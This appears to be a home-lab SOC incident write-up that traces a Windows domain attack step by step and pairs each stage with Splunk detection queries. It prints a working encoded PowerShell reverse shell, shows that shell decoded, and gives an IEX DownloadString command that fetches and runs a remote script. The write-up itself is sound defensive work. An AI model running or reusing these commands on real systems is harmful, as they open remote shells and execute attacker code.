# Attack Timeline and Investigation

## Initial Detection

Incident was identified through a preconfigured Splunk alert detecting malicious PowerShell activity.

## 1. Initial Access and C2 Establishment (21:53 - 22:03)
 - Action: Attacker executes malicious PowerShell command that downloads malicious script, and then they execute another PowerShell script that establishes reverse shell connection.
 - Evidence: Two "Malicious PowerShell Command Detected" alerts triggered.


![Malicious PowerShell Command Detected Alert1](../images/powershell_download_alert.png)
![Malicious PowerShell Command Detected Alert2](../images/powershell_c2_alert.png)
![Powershell C2 and Download Commands exeuction](../images/powershell_c2_and_download_evidence.png)
 - Full Commands:


Reverse shell connection command:
 ```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADMAMwAuADMAMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
this command after decoding looks like this:
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.33.33",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Malicious script Download command:
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://nonexistentlinknotmaliciousatall.local/payload.ps1')"
```
SPL used in alert and for searching for these commands:
```
index="wineventlog" source="*Sysmon/Operational" EventCode=1 
(Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\powershell_ise.exe") 
| where match(CommandLine, "(?i)(-enc|base64|IEX|DownloadString|WebClient|Invoke-Shellcode|BitTransfer)") 
| table _time, host, User, CommandLine 
| sort -_time
```
## 2. Post-Exploitation Discovery (22:03 - 22:42)
 - Action: Attacker ran discovery command to identify user, and groups
 - Evidence: Alert for "Discovery Commands Detection" triggered.


![Discovery Commands Detection Alert](../images/discover_command_alert.png)
![Discovery Command Evidence](../images/discovery_command_evidence.png)


SPL used in alert:
```
index="wineventlog" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search CommandLine="*whoami*" OR CommandLine="*net user*" OR CommandLine="*ipconfig*" OR CommandLine="*systeminfo*" OR CommandLine="*net group*"
| table _time, host, User, Image, CommandLine, ParentImage
```
## 3.Credential Access: Kerberoasting (22:48)
 - Action: Attacker attempted to harvest service account credentials via Kerberoasting.
 - Evidence: Alert for "Suspicious Kerberos RC4 Ticket Request" triggered.


 ![Suspicious Kerberos RC4 alert](../images/suspicious_kerberos_rc4_alert.png)
 ![Suspicious Kerberos RC4 evidence](../images/suspicious_kerberos_rc4_evidence.png)


SPL used in alert:
```
index="wineventlog" EventCode=4769 TicketOptions="0x40810000" TicketEncryptionType="0x17"
| xmlkv
| table _time, host, TargetUserName, ServiceName, IpAddress, TicketEncryptionType
```


## 4. Failed Privilege Escalation (23:08 - 23:30)
 - Action: Attacker attempts to add m.victim account to the local Administrators group.
 - Ooutcome: Failed, Access Control blocked the operation.
 - Evidence of failure: Multiple attempts to run net localgroup, but no Event ID 4732 was generated for this account during this window

![Failed privilege escalation evidence](../images/failed_privilege_escalation_evidence.png)


SPL:
```
index=wineventlog EventID=1  ParentUser="soclab\\sql_svc" | table  _time, Image, CommandLine, ParentImage  | sort  _time
```
and for EventCode = 4732
```
index=wineventlog EventCode = 4732
```


## 5. Credential Theft from File (00:11)
 - Action: Attacker reverts to manual discovery and finds passwords.txt on the desktop
 - Evidence: Sysmon ID 1 logs notepad.exe opening the plaintext password file

 ![Credential theft evidence](../images/credential_theft_evidence1.png)
 ![Credential theft evidence 2](../images/credential_theft_evidence2.png)

SPL (looked through events manually and set the time after 23:30):
```
index="wineventlog" source="Sysmon" EventCode=1
| table _time, User, Image, CommandLine
| sort _time
```

## 6. Administrator compromise and domain access (00:12)
 - Action: Attacker authenticates as soclab\Administrator and maps the Domain Controller's C$ share.
 - Evidence: Sysmon ID 1 logs

![Administrator and domain access evidence](../images/administrator_and_domain_access_evidence.png)

## 7. Data Exfiltration
 - Action: Using Administrator privileges attacker exfiltrates finance_leak.zip via HTTP POST
 - Evidence: Event ID 4104 captures the Invoke-WebRequest command in plaintext

![Data Exfiltration evidence](../images/data_exfiltration_evidence.png)


SPL:
```
index="wineventlog" EventCode=4104
| table _time, ScriptBlockText
| sort _time
```
